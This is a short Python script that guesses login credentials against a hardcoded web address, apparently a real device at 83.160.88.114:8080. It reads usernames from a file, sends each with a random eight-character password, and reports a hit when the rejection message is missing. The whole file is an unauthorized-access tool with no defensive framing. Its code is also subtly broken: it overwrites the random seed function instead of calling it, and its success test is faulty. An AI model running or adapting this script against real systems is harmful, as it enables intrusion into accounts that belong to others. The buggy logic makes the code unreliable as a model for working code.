import requests
import os
import random
import string
import json

def post_it(name):

    # name_extra = ''.join(random.choice(string.digits)) // Salt

    username = name.lower()
    password = ''.join(random.choice(chars) for i in range(8))

    response = requests.post(url, allow_redirects=False, data={
    	'username': username,
    	'password': password,
        'Submit': "submit"
    })

    print('sending username '+username+' and password '+password+"\t"+str(response.content))
    if "not permission" and "is invalid" not in str(response.content):
        print("[+] {} : {} Worked".format(username, password))
        exit(0)

if __name__ == "__main__":

    chars = string.ascii_letters + string.digits
    random.seed = (os.urandom(1024))

    url = 'http://83.160.88.114:8080/home.htm'

    names = json.loads(open('names.json').read())

    for name in names:
      post_it(name)